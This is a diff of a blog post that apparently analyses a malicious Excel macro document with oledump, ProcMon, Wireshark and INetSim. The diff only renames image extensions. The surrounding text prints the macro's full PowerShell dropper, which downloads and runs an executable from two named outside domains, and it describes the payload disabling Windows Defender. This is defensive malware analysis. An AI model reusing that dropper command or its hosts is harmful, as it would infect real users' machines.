@@ -13,7 +13,7 @@ The first command we'll use is the following:
 
 `oledump.py sample.xls`
 
-![oledump.py results on Remnux](/assets/images/happy_maldocs/remnux_oledump.JPG)
+![oledump.py results on Remnux](/assets/images/happy_maldocs/remnux_oledump.jpg)
 
  This tells us that OLE streams 7,8,9,10,18,20,21,22 have VB script in them, so let's extract that using this command, where STREAM_NUMBER represents one of the previously listed values:
 
@@ -21,21 +21,22 @@ The first command we'll use is the following:
 
  With the VB extracted, we should now be able to find the malicious function. Admittedly, I am not as adept at Visual Basic as I could be, but I know enough to know that a shell call shouldn't be here!
 
-![VisualBasic calling shell](/assets/images/happy_maldocs/vb_shell_call.JPG)
+![VisualBasic calling shell](/assets/images/happy_maldocs/vb_shell_call.jpg)
 
 Even without knowing much VB, it is clear that this Excel file opens a shell of some sort, so let's run it in a VM to verify. Thanks to Microsoft, you can get free 90-day virtual images of every OS since Windows 7 (all in 32-bit)! I used a Windows 7 VM loaded with Office, Sysmon, and I threw ProcMon on there for good measure. Once loaded, the document indeed opens a shell, noted by ProcMon's capture:
-![ProcMon capturing Excel creating a shell](/assets/images/happy_maldocs/procmon_excel_launch_powershell.JPG)
+![ProcMon capturing Excel creating a shell](/assets/images/happy_maldocs/procmon_excel_launch_powershell.jpg)
 
 ```powershell powershell "'powershell ""function better([string] $qqqqqqqq_qqqqqq74_qqq){(new-object system.net.webclient).downloadfile($qqqqqqqq_qqqqqq74_qqq,''C:\Users\IEUser\AppData\Local\Temp\work.exe'');start-process ''C:\Users\IEUser\AppData\Local\Temp\work.exe'';}try{better(''http://carasaan.com/conte.ntet'')}catch{better(''http://mustardcafeonline.com/conte.ntet'')}'"" | out-file -encoding ascii -filepath C:\Users\IEUser\AppData\Local\Temp\qeneral.bat; start-process 'C:\Users\IEUser\AppData\Local\Temp\qeneral.bat' -windowstyle hidden"```
 
 So now we can see it attempts to download a file. Using REMnux again, we can setup a server that will deliver the file to the victim VM, allowing us to proceed further. To do this, we have configured REMnux to use a static IP address. Then, we use a handy script, `accept-all-ips start eth0` that configures REMnux to receive all incoming connections. To handle those connections, we use INetSim. I also configured INetSim to deliver the file mentioned in the previous Powershell command, so that when the victim VM sends an HTTP GET request for the file, it will be delivered as if the victim connected to the real domain. The following screenshots show the requests:
-![Wireshark showing payload download](/assets/images/happy_maldocs/wireshark_get_payload_and_ip.JPG)
 
-![INetSim results of payload download](/assets/images/happy_maldocs/inetsim_gets.JPG)
+![Wireshark showing payload download](/assets/images/happy_maldocs/wireshark_get_payload_and_ip.jpg)
+
+![INetSim results of payload download](/assets/images/happy_maldocs/inetsim_gets.jpg)
 
 You can also see from the above screenshots that something starts attempting to find the victim's IP address. Note: I had configured REMnux to deliver the malware by default, hence the multiple downloads. With my current configuration, the IP address would not be delivered to the victim, so I opened it up to the internet to see what happens once it is able to retrieve the address.
 
-![WireShark showing payload download and TLS outbound connection](/assets/images/happy_maldocs/wireshark_get_ip_to_tls.JPG)
+![WireShark showing payload download and TLS outbound connection](/assets/images/happy_maldocs/wireshark_get_ip_to_tls.jpg)
 
 It appears that the sample retrieves the IP address then sets up a TLS connection. Where does it connect to? Luckily Sysmon caught the connections. 
 
@@ -44,12 +45,12 @@ It appears that the sample retrieves the IP address then sets up a TLS connectio
 
 At the same time these connections are happening, the payload attempts to stop and delete the WinDefend service:
 
-![ProcMon showing nasty process trying to stop Windows Defender](/assets/images/happy_maldocs/procmon_stop_windefend.JPG)
+![ProcMon showing nasty process trying to stop Windows Defender](/assets/images/happy_maldocs/procmon_stop_windefend.jpg)
 
 Without decrypting the SSL, we can see that there are some large downloads occurring. If you watch while those connections are happening, you also notice that some other files get downloaded to the computer. These consist of modules and configuration files.
 
-![Windows File Explorer output showing modules in their download location](/assets/images/happy_maldocs/modules.JPG)
-![Windows File Explorer output showing modules in their download location](/assets/images/happy_maldocs/modules_list.JPG")
+![Windows File Explorer output showing modules in their download location](/assets/images/happy_maldocs/modules.jpg)
+![Windows File Explorer output showing modules in their download location](/assets/images/happy_maldocs/modules_list.jpg")
 
 There are four modules that get downloaded to the victim's computer:
 - injectDll32
